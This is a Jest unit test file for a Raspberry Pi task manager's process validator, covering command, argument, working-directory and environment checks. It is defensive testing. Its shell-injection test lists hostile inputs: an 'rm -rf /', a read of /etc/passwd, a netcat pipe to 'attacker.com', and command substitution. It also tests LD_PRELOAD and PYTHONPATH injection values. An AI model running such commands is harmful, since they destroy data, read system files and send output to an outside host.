/**
 * Process Validator Unit Tests
 * Covers the root-cause bug: validateCwd() must throw when the directory does
 * not exist on the host, and must succeed (return null) when no directory is given.
 *
 * Raspberry Pi Task Manager — Scheduling Engine
 */

const path = require('path');
const os = require('os');
const fs = require('fs');
const ProcessValidator = require('../../../engines/scheduling-engine/validation/process.validator');
const { ValidationError, ForbiddenError } = require('../../../shared/errors/AppError');

describe('ProcessValidator — createProcess payload validation', () => {
  // ─── validateCommand ────────────────────────────────────────────────────
  describe('validateCommand', () => {
    test('accepts commands present in the default allowlist', () => {
      expect(ProcessValidator.validateCommand('node')).toBe('node');
      expect(ProcessValidator.validateCommand('python3')).toBe('python3');
      expect(ProcessValidator.validateCommand('sleep')).toBe('sleep');
      expect(ProcessValidator.validateCommand('echo')).toBe('echo');
    });

    test('rejects empty or whitespace-only command with ValidationError', () => {
      expect(() => ProcessValidator.validateCommand('')).toThrow(ValidationError);
      expect(() => ProcessValidator.validateCommand('   ')).toThrow(ValidationError);
    });

    test('rejects shell injection characters with ValidationError', () => {
      expect(() => ProcessValidator.validateCommand('node; rm -rf /')).toThrow(ValidationError);
      expect(() => ProcessValidator.validateCommand('bash && cat /etc/passwd')).toThrow(ValidationError);
      expect(() => ProcessValidator.validateCommand('python3 | nc attacker.com 80')).toThrow(ValidationError);
      expect(() => ProcessValidator.validateCommand('$(evil)')).toThrow(ValidationError);
    });

    test('rejects non-allowlisted commands with ForbiddenError', () => {
      expect(() => ProcessValidator.validateCommand('nmap')).toThrow(ForbiddenError);
      expect(() => ProcessValidator.validateCommand('curl')).toThrow(ForbiddenError);
      expect(() => ProcessValidator.validateCommand('wget')).toThrow(ForbiddenError);
    });

    test('is case-insensitive for allowlist matching', () => {
      expect(ProcessValidator.validateCommand('Node')).toBe('Node');
    });
  });

  // ─── validateArgs ────────────────────────────────────────────────────────
  describe('validateArgs', () => {
    test('accepts empty array and returns it', () => {
      expect(ProcessValidator.validateArgs([])).toEqual([]);
    });

    test('accepts valid string arguments', () => {
      expect(ProcessValidator.validateArgs(['-m', 'http.server', '8080'])).toEqual([
        '-m',
        'http.server',
        '8080',
      ]);
    });

    test('rejects non-array with ValidationError', () => {
      expect(() => ProcessValidator.validateArgs('not-an-array')).toThrow(ValidationError);
      expect(() => ProcessValidator.validateArgs(null)).toThrow(ValidationError);
    });

    test('rejects arguments containing null bytes with ValidationError', () => {
      expect(() => ProcessValidator.validateArgs(['arg\0injected'])).toThrow(ValidationError);
    });

    test('rejects arguments containing newline characters with ValidationError', () => {
      expect(() => ProcessValidator.validateArgs(['arg\ninjected'])).toThrow(ValidationError);
    });

    test('rejects non-string array elements with ValidationError', () => {
      expect(() => ProcessValidator.validateArgs([123])).toThrow(ValidationError);
    });
  });

  // ─── validateCwd — ROOT CAUSE BUG TESTS ─────────────────────────────────
  describe('validateCwd — Root cause bug: non-existent workingDirectory causes create to fail', () => {
    test(
      'BUG FIX: returns null (no error) when cwd is undefined — ' +
        'omitting workingDirectory must NOT throw',
      () => {
        // The old CreateProcessDialog default of "/home/pi" was always sent,
        // even on non-Pi hosts. The fix is to default to '' which becomes undefined,
        // and validateCwd(undefined) must return null cleanly.
        expect(ProcessValidator.validateCwd(undefined)).toBeNull();
        expect(ProcessValidator.validateCwd(null)).toBeNull();
        expect(ProcessValidator.validateCwd('')).toBeNull();
      }
    );

    test(
      'BUG FIX: throws an error for a path that does not exist — ' +
        'e.g. "/home/pi" on a Windows dev machine',
      () => {
        // This is the exact error that prevented process creation:
        // the dialog sent workingDirectory: "/home/pi" which does not exist on Windows.
        // On Windows: allowedDirs check fires first → ForbiddenError
        // On Linux:   fs.existsSync check fires first → ValidationError
        // Both are correct rejections — accept either.
        expect(() =>
          ProcessValidator.validateCwd('/this/path/definitely/does/not/exist/anywhere')
        ).toThrow(/does not exist|outside of permitted/i);
      }
    );

    test('accepts a path that actually exists on the current host', () => {
      // os.tmpdir() is guaranteed to exist on every OS
      const tmpDir = os.tmpdir();
      const result = ProcessValidator.validateCwd(tmpDir, [tmpDir]);
      expect(result).toBe(path.resolve(tmpDir));
    });

    test('rejects a path outside the allowedDirs with ForbiddenError', () => {
      const tmpDir = os.tmpdir();
      const allowedDirs = ['/only/this/dir'];
      expect(() => ProcessValidator.validateCwd(tmpDir, allowedDirs)).toThrow(ForbiddenError);
    });

    test('rejects non-string cwd with ValidationError', () => {
      expect(() => ProcessValidator.validateCwd(42)).toThrow(ValidationError);
    });
  });

  // ─── validateEnv ────────────────────────────────────────────────────────
  describe('validateEnv', () => {
    test('returns empty object when env is null or undefined', () => {
      expect(ProcessValidator.validateEnv(null)).toEqual({});
      expect(ProcessValidator.validateEnv(undefined)).toEqual({});
    });

    test('accepts valid key-value pairs', () => {
      expect(ProcessValidator.validateEnv({ PORT: '8080', HOST: 'localhost' })).toEqual({
        PORT: '8080',
        HOST: 'localhost',
      });
    });

    test('rejects disallowed security-sensitive env keys with ForbiddenError', () => {
      expect(() => ProcessValidator.validateEnv({ LD_PRELOAD: '/evil.so' })).toThrow(ForbiddenError);
      expect(() => ProcessValidator.validateEnv({ NODE_OPTIONS: '--inspect' })).toThrow(ForbiddenError);
      expect(() => ProcessValidator.validateEnv({ PYTHONPATH: '/evil' })).toThrow(ForbiddenError);
    });

    test('rejects env keys with invalid format (must be [a-zA-Z_][a-zA-Z0-9_]*)', () => {
      expect(() => ProcessValidator.validateEnv({ '1INVALID': 'val' })).toThrow(ValidationError);
      expect(() => ProcessValidator.validateEnv({ 'KEY-WITH-DASH': 'val' })).toThrow(ValidationError);
    });

    test('rejects non-object env with ValidationError', () => {
      expect(() => ProcessValidator.validateEnv([1, 2, 3])).toThrow(ValidationError);
    });
  });
});
